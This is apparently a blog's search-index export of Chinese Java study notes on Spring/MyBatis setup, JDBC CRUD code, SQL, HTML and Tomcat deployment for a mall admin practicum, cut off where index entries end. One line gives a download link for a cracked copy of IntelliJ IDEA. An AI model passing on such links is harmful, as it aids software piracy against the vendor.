\u003cgroupId\u003eorg.springframework\u003c/groupId\u003e \u003cartifactId\u003espring-webmvc\u003c/artifactId\u003e \u003cversion\u003e5.2.7.RELEASE\u003c/version\u003e \u003c/dependency\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.aspectj\u003c/groupId\u003e \u003cartifactId\u003easpectjweaver\u003c/artifactId\u003e \u003cversion\u003e1.9.4\u003c/version\u003e \u003c/dependency\u003e \u003c!-- https://mvnrepository.com/artifact/org.springframework/spring-jdbc --\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.springframework\u003c/groupId\u003e \u003cartifactId\u003espring-jdbc\u003c/artifactId\u003e \u003cversion\u003e5.2.7.RELEASE\u003c/version\u003e \u003c/dependency\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.mybatis\u003c/groupId\u003e \u003cartifactId\u003emybatis\u003c/artifactId\u003e \u003cversion\u003e3.5.2\u003c/version\u003e \u003c/dependency\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.mybatis\u003c/groupId\u003e \u003cartifactId\u003emybatis-spring\u003c/artifactId\u003e \u003cversion\u003e2.0.4\u003c/version\u003e \u003c/dependency\u003e \u003cdependency\u003e \u003cgroupId\u003emysql\u003c/groupId\u003e \u003cartifactId\u003emysql-connector-java\u003c/artifactId\u003e \u003cversion\u003e8.0.12\u003c/version\u003e \u003c/dependency\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.projectlombok\u003c/groupId\u003e \u003cartifactId\u003elombok\u003c/artifactId\u003e \u003cversion\u003e1.18.12\u003c/version\u003e \u003c/dependency\u003e \u003c/dependencies\u003e \u003c!--在build中配置resources，来防止资源导出失败的问题--\u003e \u003c!-- Maven解决静态资源过滤问题 --\u003e \u003cbuild\u003e \u003cresources\u003e \u003cresource\u003e \u003cdirectory\u003esrc/main/java\u003c/directory\u003e \u003cincludes\u003e \u003cinclude\u003e**/*.properties\u003c/include\u003e \u003cinclude\u003e**/*.xml\u003c/include\u003e \u003c/includes\u003e \u003cfiltering\u003efalse\u003c/filtering\u003e \u003c/resource\u003e \u003cresource\u003e \u003cdirectory\u003esrc/main/resources\u003c/directory\u003e \u003cincludes\u003e \u003cinclude\u003e**/*.properties\u003c/include\u003e \u003cinclude\u003e**/*.xml\u003c/include\u003e \u003c/includes\u003e \u003cfiltering\u003efalse\u003c/filtering\u003e \u003c/resource\u003e \u003c/resources\u003e \u003c/build\u003e 编写顺序： User -\u003e UserMapper -\u003e UserMapper.xml -\u003e spring-dao.xml -\u003e UserServiceImpl -\u003e applicationContext.xml -\u003e MyTest6 代码步骤： pojo实体类 User package pojo; import lombok.Data; @Data public class User { private int id; private String name; private String pwd; } mapper目录下的 UserMapper、UserMapperImpl、UserMapper.xml 接口UserMapper package mapper; impor","date":"2021-04-06","objectID":"/posts/spring/:12:1","tags":["Spring"],"title":"Spring","uri":"/posts/spring/"},{"categories":["Java后端"],"content":"12.2、mybatis-spring-方式二 UserServiceImpl2 package mapper; import pojo.User; import org.apache.ibatis.session.SqlSession; import org.mybatis.spring.support.SqlSessionDaoSupport; import java.util.List; //继承SqlSessionDaoSupport 类 public class UserMapperImpl2 extends SqlSessionDaoSupport implements UserMapper { public List\u003cUser\u003e getUser() { SqlSession sqlSession = getSqlSession(); UserMapper mapper = sqlSession.getMapper(UserMapper.class); return mapper.getUser(); //或者一句话：return getSqlSession().getMapper(UserMapper.class).getUser(); } } spring-dao.xml \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003cbeans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:aop=\"http://www.springframework.org/schema/aop\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans https://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/aop https://www.springframework.org/schema/aop/spring-aop.xsd\"\u003e \u003c!--DataSource:使用Spring的数帮源替换Mybatis的配置 c3p0 dbcp druid 这使用Spring提供的JDBC: org.springframework.jdbc.datasource --\u003e \u003c!--data source --\u003e \u003cbean id=\"datasource\" class=\"org.springframework.jdbc.datasource.DriverManagerDataSource\"\u003e \u003cproperty name=\"driverClassName\" value=\"com.mysql.cj.jdbc.Driver\" /\u003e \u003cproperty name=\"url\" value=\"jdbc:mysql://127.0.0.1:3306/mybatis?useSSL=false\u0026amp;useUnicode=true\u0026amp;characterEncoding=utf-8\u0026amp;serverTimezone=Asia/Shanghai\"/\u003e \u003cproperty name=\"username\" value=\"root\" /\u003e \u003cproperty name=\"password\" value=\"root\" /\u003e \u003c/bean\u003e \u003c!--sqlSessionFactory--\u003e \u003cbean id=\"sqlSessionFactory\" class=\"org.mybatis.spring.SqlSessionFactoryBean\"\u003e \u003cproperty name=\"dataSource\" ref=\"datasource\" /\u003e \u003c!--绑定 mybatis 配置文件--\u003e \u003cproperty name=\"configLocation\" value=\"classpath:mybatis-config.xml\"/\u003e \u003cproperty name=\"mapperLocations\" value=\"classpath:mapper/*.xml\"/\u003e \u003c/bean\u003e \u003c!-- 方法二：SqlSessionTemplate 可以不写了--\u003e \u003c/beans\u003e applicationContext.xml \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003cbeans xmlns=\"http://www.springframewo","date":"2021-04-06","objectID":"/posts/spring/:12:2","tags":["Spring"],"title":"Spring","uri":"/posts/spring/"},{"categories":["Java后端"],"content":"13. 声明式事务 把一组业务当成一个业务来做；要么都成功，要么都失败！ 事务在项目开发中，十分的重要，涉及到数据的一致性问题 确保完整性和一致性 事务的ACID原则： 1、原子性 2、隔离性 3、一致性 4、持久性 ACID参考文章：https://www.cnblogs.com/malaikuangren/archive/2012/04/06/2434760.html Spring中的事务管理 声明式事务：AOP 编程式事务：需要再代码中，进行事务管理 声明式事务 先导入jar包 \u003cdependencies\u003e \u003c!-- https://mvnrepository.com/artifact/org.springframework/spring-webmvc --\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.springframework\u003c/groupId\u003e \u003cartifactId\u003espring-webmvc\u003c/artifactId\u003e \u003cversion\u003e5.2.7.RELEASE\u003c/version\u003e \u003c/dependency\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.aspectj\u003c/groupId\u003e \u003cartifactId\u003easpectjweaver\u003c/artifactId\u003e \u003cversion\u003e1.9.4\u003c/version\u003e \u003c/dependency\u003e \u003c!-- https://mvnrepository.com/artifact/org.springframework/spring-jdbc --\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.springframework\u003c/groupId\u003e \u003cartifactId\u003espring-jdbc\u003c/artifactId\u003e \u003cversion\u003e5.2.7.RELEASE\u003c/version\u003e \u003c/dependency\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.mybatis\u003c/groupId\u003e \u003cartifactId\u003emybatis\u003c/artifactId\u003e \u003cversion\u003e3.5.2\u003c/version\u003e \u003c/dependency\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.mybatis\u003c/groupId\u003e \u003cartifactId\u003emybatis-spring\u003c/artifactId\u003e \u003cversion\u003e2.0.4\u003c/version\u003e \u003c/dependency\u003e \u003cdependency\u003e \u003cgroupId\u003emysql\u003c/groupId\u003e \u003cartifactId\u003emysql-connector-java\u003c/artifactId\u003e \u003cversion\u003e8.0.12\u003c/version\u003e \u003c/dependency\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.projectlombok\u003c/groupId\u003e \u003cartifactId\u003elombok\u003c/artifactId\u003e \u003cversion\u003e1.18.12\u003c/version\u003e \u003c/dependency\u003e \u003c/dependencies\u003e \u003c!--在build中配置resources，来防止资源导出失败的问题--\u003e \u003c!-- Maven解决静态资源过滤问题 --\u003e \u003cbuild\u003e \u003cresources\u003e \u003cresource\u003e \u003cdirectory\u003esrc/main/java\u003c/directory\u003e \u003cincludes\u003e \u003cinclude\u003e**/*.properties\u003c/include\u003e \u003cinclude\u003e**/*.xml\u003c/include\u003e \u003c/includes\u003e \u003cfiltering\u003efalse\u003c/filtering\u003e \u003c/resource\u003e \u003cresource\u003e \u003cdirectory\u003esrc/main/resources\u003c/directory\u003e \u003cincludes\u003e \u003cinclude\u003e**/*.properties\u003c/include\u003e \u003cinclude\u003e**/*.xml\u003c/include\u003e \u003c/includes\u003e \u003cfiltering\u003efalse\u003c/filtering\u003e \u003c/resource\u003e \u003c/resources\u003e \u003c/build\u003e 代码步骤： pojo实体类 User package pojo; import lombok.AllArgsConstructor; import lombok.Data; import lombok.NoArgsConstructor; @Data @AllArgsConstructor @NoArgsConstructor public class User { private int id; private String name; priva","date":"2021-04-06","objectID":"/posts/spring/:13:0","tags":["Spring"],"title":"Spring","uri":"/posts/spring/"},{"categories":["大三上实训笔记"],"content":"大三上学期小米商城实训辅助知识点总结","date":"2021-04-06","objectID":"/posts/%E5%8D%83%E5%B3%B0%E5%AE%9E%E8%AE%AD/","tags":[],"title":"千峰实训","uri":"/posts/%E5%8D%83%E5%B3%B0%E5%AE%9E%E8%AE%AD/"},{"categories":["大三上实训笔记"],"content":"一、实训规划 1.1 项目 项目名称：《小米商城后台管理系统》 项目功能要求： 管理员登录 商品类别管理 商品信息管理 文件上传 分页 1.2 课程规划 时间 内容 Day1 Java语法复习（补充必要的知识点）、数据库复习（MySQL安装配置，SQL） Day2 JDBC数据库编程（DAO\\DTO模式、CRUD操作封装）—-完成项目的数据库设计 Day3 前端（HTML\\CSS复习，JavaScript，前端框架Layui）—-完成项目的页面设计 Day4 Servlet复习，JSP（Java Server Page），JSTL Day5 完成管理员登录功能、商品类别添加功能 Day6 完成商品类别列表、删除类别、修改类别功能 Day7 完成商品添加（文件上传）、商品列表、商品详情 （商品修改、删除商品自行完成） Day8 项目部署、项目验收 1.3 软件的基本结构 如果要去完成一个项目，首先就要了解一个项目的结构，从项目的结构中分析所需的技术，然后补充相应的技术，以完成项目的开发。 软件结构 1.4 软件开发流程 明确项目的需求 项目功能设计 完成数据库设计 完成流程设计 完成UI界面 项目功能实现 编码 运行(功能测试) 项目测试（专业测试人员） 项目交付（项目部署） ","date":"2021-04-06","objectID":"/posts/%E5%8D%83%E5%B3%B0%E5%AE%9E%E8%AE%AD/:1:0","tags":[],"title":"千峰实训","uri":"/posts/%E5%8D%83%E5%B3%B0%E5%AE%9E%E8%AE%AD/"},{"categories":["大三上实训笔记"],"content":"二、Java语言的复习 2.1 Java概述 Java是一种面向对象的服务器编程语言 Java出现于1991年，正式发布于1995年 Java语言的摇篮：SUN Java语言之父：James·Gosling 高斯林 Java语言的技术架构（Java语言可以干什么？） 2002开始占据编程语言排行榜第一 J2ME 传统手机上的软件（嵌入式编程） JavaSE AWT/swing PC桌面程序 （百里挑一） JavaEE 企业级应用（B/S）、互联网应用——解决三高问题 Android-SDK 手机应用（Android） （百里有一） 2.2 编译和解释 编程语言都是由字母、数字、符号组成，然而计算机只能识别机器语言（二进制），因此我们写好的程序源文件在计算机OS上执行必须要经过一个转换的过程，转换的方式有2种：编译和解释 编译 源文件先经过产生一个中间文件（可执行文件），计算机OS执行这个可执行文件 解释 源文件不会提前编译产生中间文件，计算机每次执行程序时都会再次进行动态的转换 Java语言是一种编译解释型语言 Java语言如何实现跨平台： Java源文件经过编译之后产生的字节码文件与操作系统无关，而是面向JVM运行的，因此无论是什么样的OS，只要能够安装JVM，就能执行Java程序 Java语言的编译解释执行过程： 2.3 JDK安装及环境变量配置 2.3.1 下载 64位链接：https://pan.baidu.com/s/1oiBEHPa4i0N94G4Br7agdQ 提取码：052g 32位链接：https://pan.baidu.com/s/1zytJsPyGCkmjp5cJbk6Hiw 提取码：atpm 2.3.2 安装 安装及环境变量配置视频链接：https://pan.baidu.com/s/1oDMk6u4ju9nPorB7-FjfxQ 提取码：zdww 傻瓜式安装 （默认安装在：） 安装目录如下 2.3.3 配置环境变量 配置环境变量，就是将JDK的bin目录路径配置到操作系统，以便于在CMD命令行窗口中输入指令时能够找到JDK的工具文件。 最简洁的配置方式： 2.4 IDE集成开发环境 2.4.1 记事本开发流程 编辑源文件： 编译运行 2.4.2 IDE工具 使用记事本做开发：第一开发效率低；第二没有错误异常提示、错误率高；项目中的多个文件不便于管理。 eclipse IDEA 2.4.3 下载安装IDEA IDEA2019.2+破解链接：https://pan.baidu.com/s/1cBrRz8Mns_yQQwna4QHGzg 提取码：v0z6 傻瓜式安装：选择界面风格（Dark,Light） 2.4.4 IDEA基本使用 代码写在方法中，方法创建在类中，类定义在包中，包创建在项目中 创建项目（基本Java项目） 启动IDEA创建Java项目 2.5 编程规范 代码的质量和优雅型处理考察功能完成情况、还会考察代码编写规范 可读性——让别人看起容易懂、看着舒服 语法规则（法律）：必须遵守的，不遵守代码不能运行 编程规范（道德）：需要遵守但是也可以不遵守 2.5.1 包名的命名规范 包名中所有字符小写 采用域后缀名倒置的形式命名 千锋 www.qfedu.com 湖大 www.hubu.edu.cn 包名结构：域后缀名.单位名称.模块名/项目组代号/项目名.包自己的名字 包名能够体现包的作用（有语义性） 2.5.2 类名的命名规范 见名知意：选取能够表达类的作用的英文单词组成 驼峰式命名：类名首字母大写，如果包含多个单词，每个单词首字母都大写 类名可以包含字母、数字、$和_，但是不能以数字开头 类名可以使用中文，但是不提倡使用 2.6 Java基础知识 2.6.1 基础部分 基础语法：变量、标识符、关键字、运算符、流程控制 面向对象：类与对象、方法定义与方法调用、特征(抽象、封装、继承、多态 ) 异常处理：try、catch、自定义异常 数组：数组定义及创建、数组遍历、排序（冒泡、快排、插入、选择）、二分法查找 常用类：String、Math、Date、DateFormat、Calendar、封装类（8个） 集合：ArrayList 集合家族Collection \\ Map家族 2.6.2 高级部分 IO流 网络编程 多线程 AWT/Swing 2.7 类、属性、方法 2.7.1 类 属性和方法要定义在类中 类的定义语法 [public] class \u003cClassName\u003e{ } []包含的内容表示可有可无 \u003c\u003e包含的内容必须有，但是可以改变 2.7.2 方法 方法，就是能够完成特定功能代码块 [\u003cpublic|protected|private\u003e] [static] \u003creturn_type\u003e \u003cm","date":"2021-04-06","objectID":"/posts/%E5%8D%83%E5%B3%B0%E5%AE%9E%E8%AE%AD/:2:0","tags":[],"title":"千峰实训","uri":"/posts/%E5%8D%83%E5%B3%B0%E5%AE%9E%E8%AE%AD/"},{"categories":["大三上实训笔记"],"content":"三、数据库设计 SQLServer Oracle (收钱) MySQL 3.1 MySQL的安装和配置 3.1.1 MySQL版本 MySQL 5.x v5.6 v5.7 MySQL 8.x 下载：MySQL5.6链接：https://pan.baidu.com/s/1Sk37sP66WJsnYrIiKxkelg 提取码：3t1m 3.1.2 MySQL安装 傻瓜式安装 端口：3306 设置密码（root）：admin123 3.1.3 安装数据库管理工具——Navicat MySQL是以服务的形式运行在OS中，没有提供可视化的窗口界面，只提供了一个DOS命令窗口用于进行指令操作；为了便于开发过程中对数据库的操作，我们需要安装一个数据库管理的视图工具——DBMS 傻瓜式安装 配置Navicat连接到MySQL数据库 Navicat连接到MySQL数据库 3.2 SQL复习 我们可以通过SQL指令完成对数据库的各种操作：建库建表、数据的增删查改等等 SQL 结构化查询语言——就是一种数据库可以“听懂”的语言 3.2.1 SQL分类 根据SQL语句的作用，我们可以将SQL语句分为四类： DDL 数据定义语言 ——建库、建表、索引、视图、存储过程、触发器 DML 数据操纵语言 ——对数据表中的数据进行增删改操作（insert\\delete\\update） DQL 数据查询语言 ——对数据表中的数据进行查询操作（select） DCL 数据控制语言 ——完成事务管理等操作（begin、commit、rollback） 3.2.2 DDL（建库建表） 数据是存储在数据表中的，数据表是创建在数据库中 数据库管理 -- 创建数据库 create database db_ytao; -- 使用数据库 use db_ytao; -- 删除数据库 drop database db_ytao; 数据表管理 -- 创建数据表 -- 学生信息表：学号、姓名、性别、年龄、手机、QQ、个性签名 -- 字符串 char定长 varchar可变 create table tb_students( stu_num char(15) primary key, stu_name varchar(20) not null, stu_gender char(2) not null, stu_age int not null, stu_tel char(11) not null unique, stu_qq varchar(11) not null unique, stu_desc varchar(200) ); 3.2.3 DML 添加操作 -- 学生信息表中添加一条数据(在表名后的括号中列出字段名) insert into tb_students(stu_num,stu_name,stu_gender,stu_age,stu_tel,stu_qq,stu_desc) values('201801010101001','王二狗','男',21,'13030303300','123456','哥只是一个传说'); insert into tb_articles(article_id,article_title,article_content) values(12,'Java学习心得','2021.01.09日开始学习Java...'); 删除操作 -- delete from table 会删除数据表中所有的数据，需要通过where来限定删除条件 delete from tb_articles where article_id=\u003e13; 修改语句 -- 修改学号为201801010101001的学生的名字和年龄 update tb_students set stu_name='王小狗',stu_age=18 where stu_num='201801010101001'; 3.2.4 DQL 查询操作 -- 显示指定列 select stu_num,stu_name,stu_gender from tb_students; select stu_num,stu_name,stu_gender,stu_age,stu_tel,stu_qq,stu_desc from tb_students; select * from tb_students; -- 条件筛选查询 select * from tb_students where stu_gender='女'; -- order by 对查询结果进行排序 select * from tb_students order by stu_age desc -- group by分组查询: select 关键字后的字段只能是被分组字段","date":"2021-04-06","objectID":"/posts/%E5%8D%83%E5%B3%B0%E5%AE%9E%E8%AE%AD/:3:0","tags":[],"title":"千峰实训","uri":"/posts/%E5%8D%83%E5%B3%B0%E5%AE%9E%E8%AE%AD/"},{"categories":["大三上实训笔记"],"content":"四、数据库编程 使用Java代码完成对数据库、数据表中的数据的访问——JDBC 4.1 JDBC的步骤 JDBC操作数据库7个步骤 4.2 JDBC实现：添加操作 案例：使用Java代码向db_ytao数据库的tb_students表中添加一条学生信息 4.2.1 建立数据库连接 将数据库连接驱动文件添加到项目中 选择Java项目名—右键—New Directory—lib 将mysql-connector-java-5.1.47.jar文件拷贝并粘贴到创建的lib文件夹 选择lib中的mysql-connector-java-5.1.47.jar文件—右键—Add as Library–OK 加载驱动 获取连接 创建连接 4.2.2 JDBC操作代码（2-7步） 2021.01.11晚上练习任务 1.复习今天的笔记，掌握软件的开发流程及数据库设计规范，完成小米商城数据表的创建 2.总结JDBC操作步骤，完成学生信息的添加操作（课堂案例） 3.完成学生信息的删除操作（根据输入的学号删除一条学生信息） 4.完成学生信息的修改操作（根据学号修改学生的姓名、性别、…） 4.3 JDBC实现：删除操作 代码如下： package cn.edu.hubu.jdbc; import java.sql.Connection; import java.sql.DriverManager; import java.sql.PreparedStatement; import java.util.Scanner; public class DeleteStudent { public static void main(String[] args) { Scanner scanner = new Scanner(System.in); System.out.println(\"请输入要删除的学生学号：\"); String stuNum = scanner.nextLine(); try { //如果这句代码需要进行异常处理，将鼠标放在红色提示后面：ALT+ENTER Class.forName(\"com.mysql.jdbc.Driver\"); //数据库连接字符串 String url = \"jdbc:mysql://localhost:3306/db_ytao?characterEncoding=utf-8\"; String username = \"root\"; String password = \"admin123\"; //在IDEA如果调用的方法有返回值，可以在方法调用完成之后，直接.var回车自动定义接收返回值的变量 Connection connection = DriverManager.getConnection(url, username, password); String sql = \"delete from tb_students where stu_num=?\"; PreparedStatement ps = connection.prepareStatement(sql); ps.setString(1,stuNum); int i = ps.executeUpdate(); System.out.println(i\u003e0?\"删除成功！\":\"删除失败！\"); connection.close(); } catch (Exception e) { e.printStackTrace(); } } } 4.4 JDBC操作：修改操作 代码如下 package cn.edu.hubu.jdbc; import java.sql.Connection; import java.sql.DriverManager; import java.sql.PreparedStatement; import java.util.Scanner; public class UpdateStudent { public static void main(String[] args) { Scanner scanner = new Scanner(System.in); System.out.println(\"请输入要修改的学生学号：\"); String stuNum = scanner.nextLine(); System.out.println(\"请输入新姓名：\"); String stuName = scanner.nextLine(); System.out.println(\"请输入新性别：\"); String stuGender = scanner.nextLine(); System.out.println(\"请输入新年龄：\"); Stri","date":"2021-04-06","objectID":"/posts/%E5%8D%83%E5%B3%B0%E5%AE%9E%E8%AE%AD/:4:0","tags":[],"title":"千峰实训","uri":"/posts/%E5%8D%83%E5%B3%B0%E5%AE%9E%E8%AE%AD/"},{"categories":["大三上实训笔记"],"content":"五、网页设计 5.1 B/S 和 C/S 项目架构方式 B/S (Browser-Server) 基于浏览器和服务器的架构模式 C/S (Client-Server) 基于客户端和服务器的架构模式，专用客户端模式（QQ） 5.2 网页设计介绍 网页就是存储在服务器、可以通过网络传输到用户、并通过浏览器展示出特定视图页面的文件 5.2.1 网页文件特点 后缀名为.html或者.htm 可以通过浏览器显示出界面 网页文件基本结构：标签 \u003c!DOCTYPE html\u003e \u003chtml\u003e \u003chead\u003e \u003cmeta charset=\"utf-8\"/\u003e \u003ctitle\u003e登录页面\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003c/body\u003e \u003c/html\u003e 5.2.2 网页三要素 HTML 超文本标记语言，决定了网页的结构（显示的内容） CSS 层叠样式表，决定了网页中视图的显示效果 JavaScript 脚本语言，决定了网页中动态效果及功能 \u003c!DOCTYPE html\u003e \u003chtml\u003e \u003chead\u003e \u003cmeta charset=\"utf-8\"/\u003e \u003ctitle\u003e登录页面\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003cinput type=\"button\" style=\"width:100px;height:25px\" value=\"点我呀\" onclick=\"test()\"/\u003e \u003cscript type=\"text/javascript\"\u003e function test(){ alert(\"从前有座山\"); } \u003c/script\u003e \u003c/body\u003e \u003c/html\u003e 5.3 HTML常用标签 5.3.1 显示标签 将文本、图片、声音、视频等在网页中进行显示和播放 \u003c!--文本--\u003e \u003clabel style=\"color:red; font-size:15px; font-family:黑体\"\u003e文本内容\u003c/label\u003e \u003c!--图片--\u003e \u003cimg src=\"img/001.jpg\" width=\"200\" height=\"100\"/\u003e \u003c!--声音--\u003e \u003caudio controls src=\"song/001.mp3\" autoplay loop=\"-1\"\u003e\u003c/audio\u003e \u003c!--视频--\u003e \u003cvideo controls src=\"mv/001.mp4\" autoplay loop=\"-1\"\u003e\u003c/video\u003e 5.3.2 输入标签 在网页中提供输入视图（文本输入框、密码输入框等）以便用户可以在页面中输入数据 \u003c!--文本输入框--\u003e\u003cinput type=\"text\"/\u003e \u003c!--密码输入框--\u003e\u003cinput type=\"password\"/\u003e \u003c!--文件选择框--\u003e\u003cinput type=\"file\"/\u003e \u003c!--单选按钮: 必须提供value属性，必须提供name属性并且同一组选项name属性必须相同--\u003e \u003cinput type=\"radio\" value=\"M\" name=”gender“/\u003e男 \u003cinput type=\"radio\" value=\"F\" name=”gender“/\u003e女 \u003c!--复选框：同单选按钮--\u003e \u003cinput type=\"checkbox\" value=\"t\" name=\"hobby\"/\u003e旅游 \u003c!--普通按钮：默认按钮上没有文字，需要通过value属性指定按钮上的文字--\u003e \u003cinput type=\"button\" value=\"普通按钮\"/\u003e \u003c!--提交按钮--\u003e\u003cinput type=\"submit\"/\u003e \u003c!--重置按钮--\u003e\u003cinput type=\"reset\"/\u003e \u003c!--图片按钮: 作用其实是一个提交按钮，通过src属性指定按钮图片--\u003e \u003cinput type=\"image\" src=\"img/btn.jpg\"/\u003e \u003c!--颜色选择框--\u003e\u003cinput type=\"color\"/\u003e \u003c!--日期输入框--\u003e\u003cinput type=\"date\"/\u003e \u003c!--数字输入框--\u003e\u003cinput type=\"number\"/\u003e \u003c!--下拉菜单：选项option标签必须提供value属性--\u003e \u003cselect\u003e \u003coption value=\"深圳\"\u003e深圳\u003c/option\u003e \u003coption value=\"WH\"\u003e武汉\u003c/option\u003e \u003c/select\u003e \u003c!--文本域:多行输入框--\u003e \u003ctextarea\u003e\u003c/textarea\u003e 5.3.3 布局标签 布局标签，就是对网页中的元素进行排版 \u003c!-- 换行 --\u003e\u003cbr/\u003e \u003c!-- 水平分割线 --\u003e \u003chr/\u003e \u003c!-- 段落 --\u003e\u003cp\u003e\u003c/p\u003e \u003c!-- 字段域 --\u003e \u003cfieldset\u003e \u003clegend\u003e字段域标题\u003c/legend\u003e \u003c/","date":"2021-04-06","objectID":"/posts/%E5%8D%83%E5%B3%B0%E5%AE%9E%E8%AE%AD/:5:0","tags":[],"title":"千峰实训","uri":"/posts/%E5%8D%83%E5%B3%B0%E5%AE%9E%E8%AE%AD/"},{"categories":["大三上实训笔记"],"content":"六、web服务器 当我们完成了网页的设计之后，如何能够让我们的网页能够被互联网用户访问呢？ 我们需要借助于web服务器软件来提供web项目的网络访问； 6.1 web服务器介绍 web服务器软件：用来管理web项目、能够接收HTTP协议请求的软件 Tomcat访问过程 6.2 安装Tomcat 6.2.1 下载安装JDK Tomcat需要依赖JDK 6.2.2 下载安装Tomcat 下载：http://tomcat.apache.org (群文件下载) 安装：注意如果没有默认加载jre路径，需要手动选择 tomcat安装选择JRE 安装之后，默认在C:\\Program Files\\Apache Software Foundation\\Tomcat 8.5 Tomcat目录结构 6.3 web项目部署 web项目部署：就是将web项目拷贝粘贴到Tomcat的webapps目录 web项目部署 6.4 启动Tomcat 启动服务器 6.5 在浏览器中访问Tomcat中的项目 6.6 云主机 由于我们使用的网络都是非商用IP，因此如果我们把项目部署在本地（自己的计算机），只能同一个局域网内可访问，如何实现互联网访问呢？ 购买商用IP 使用内网穿透（需要本地计算机服务器同时启动） 使用云主机 项目上云 ","date":"2021-04-06","objectID":"/posts/%E5%8D%83%E5%B3%B0%E5%AE%9E%E8%AE%AD/:6:0","tags":[],"title":"千峰实训","uri":"/posts/%E5%8D%83%E5%B3%B0%E5%AE%9E%E8%AE%AD/"},{"categories":["大三上实训笔记"],"content":"大三上学期小米商城后台管理系统实训笔记","date":"2021-04-06","objectID":"/posts/%E5%95%86%E5%9F%8E%E7%B3%BB%E7%BB%9F%E7%AC%94%E8%AE%B0/","tags":[],"title":"商城系统笔记","uri":"/posts/%E5%95%86%E5%9F%8E%E7%B3%BB%E7%BB%9F%E7%AC%94%E8%AE%B0/"},{"categories":["大三上实训笔记"],"content":"《小米商城后台管理系统》 ","date":"2021-04-06","objectID":"/posts/%E5%95%86%E5%9F%8E%E7%B3%BB%E7%BB%9F%E7%AC%94%E8%AE%B0/:1:0","tags":[],"title":"商城系统笔记","uri":"/posts/%E5%95%86%E5%9F%8E%E7%B3%BB%E7%BB%9F%E7%AC%94%E8%AE%B0/"},{"categories":["大三上实训笔记"],"content":"一、需求分析 电商系统项目结构 管理员登录 管理员要使用正确的账号和密码进行登录之后才能使用这个管理系统 商品类别管理 通过管理系统，能够动态完成添加商品类别、商品类别列表、修改类别及删除类别等操作 商品管理 通过管理系统，可以动态完成商品发布、商品列表（分页）、修改商品信息、删除商品信息（下架） 用户管理 订单管理 售后服务 ","date":"2021-04-06","objectID":"/posts/%E5%95%86%E5%9F%8E%E7%B3%BB%E7%BB%9F%E7%AC%94%E8%AE%B0/:2:0","tags":[],"title":"商城系统笔记","uri":"/posts/%E5%95%86%E5%9F%8E%E7%B3%BB%E7%BB%9F%E7%AC%94%E8%AE%B0/"},{"categories":["大三上实训笔记"],"content":"二、项目设计 2.1 数据库设计 2.1.1 分析数据实体 管理员 类别 商品 2.1.2 提取实体数据项 根据甲方的业务需求及项目的功能需求分析每个数据实体的属性 管理员（管理员编号/工号，管理员账号，管理员密码，管理员姓名，管理员头像，管理员电话） 类别（类别ID，类别名称，类别描述） 商品（商品编号，商品名称，商品图片，商品价格，商品库存，商品说明，图文详情）、 2.1.3 规范实体数据项 使用数据库设计范式检查数据项是否合理——数据库设计三范式 第一范式：数据表中的字段不可再分 第二范式：不存在非关键字段对关键字段的部分函数依赖 第三范式：不存在非关键字段之间的传递依赖 2.1.4 绘制实体关系图（E-R） 通过E-R图例，分析实体和实体之间的关系（一对一、一对多、多对一、多对多） 在企业开发中通常是通过PD进行数据库建模 实体关系图 2.1.5 数据表设计（三线图） 2.1.6 建库建表（SQL） 大家根据三线图自行完成 2.2 业务流程设计 项目中业务实现的过程 2.2.1 管理登录业务流程 管理员登录 2.2.2 类别管理业务流程 添加类别 类别列表 修改类别 删除类别 2.2.3 商品管理业务流程 发布商品 商品列表 修改商品 删除商品 商品详情 2.3 UI界面设计 2.3.1 管理员登录 登录页面 login.html 主页面 index.html 2.3.2 类别管理 类别添加页面 type-add.html 类别列表页面 type-list.html 类别修改页面 type-modify.html 提示页面 tips.html 2.3.3 商品管理 暂略 ","date":"2021-04-06","objectID":"/posts/%E5%95%86%E5%9F%8E%E7%B3%BB%E7%BB%9F%E7%AC%94%E8%AE%B0/:3:0","tags":[],"title":"商城系统笔记","uri":"/posts/%E5%95%86%E5%9F%8E%E7%B3%BB%E7%BB%9F%E7%AC%94%E8%AE%B0/"},{"categories":["大三上实训笔记"],"content":"三、编码—数据库编程、UI 3.1 创建项目—web项目 3.1.1 web项目创建 3.1.2 IDEA启动tomcat 启动 如果在启动Tomcat时出现以下错误，请手动打开Tomcat/bin/tomcat8w.exe关闭之前运行的Tomcat 3.1.3 修改项目的访问路径 在IDEA中启动Tomcat，会自动将web项目部署到Tomcat，但是web项目的访问路径默认与web名称时不一致的；我们可以设置项目访问路径 3.1.4 设置项目的默认访问页面 当我们启动Tomcat之后，通过路径http://ip:port/pro_name后面没有指定访问的页面名称，会默认访问index.html,如果没有index.html就寻找index.jsp web/WEB-INF/web.xml 3.2 完成项目业务所需的JDBC操作 完成项目业务流程中所需的数据库操作 3.2.1 向web项目中添加mysql数据库驱动文件 在web/WEB-INF目录下创建lib文件夹，将驱动文件拷贝粘贴到此文件夹，然后Add as Library 目录结构 3.2.2 创建数据库连接工具类DBUtil 创建cn.edu.hubu.xmsc.utils包 在cn.edu.hubu.xmsc.utils包装创建DBUtil类 DBUtil 3.2.3 完成管理登录所需的数据库操作 DTO类 Manager DAO类 ManagerDAO 3.2.4 完成类别管理的数据库操作 DTO类 Type DAO类 TypeDAO 3.3 设计界面并把界面整合到项目中 3.3.1 添加页面到项目的web目录 将在HBuilder中设计完成的HTML文件及其关联的静态资源(css\\js\\img\\fonts)拷贝到Javaweb项目的 web目录 3.3.2 将HTML页面转换成JSP页面 JSP（Java Server Page） 是一种基于web服务器运行的动态网页技术 支持Java代码 必须依赖于web服务器运行，不能使用浏览器直接打开 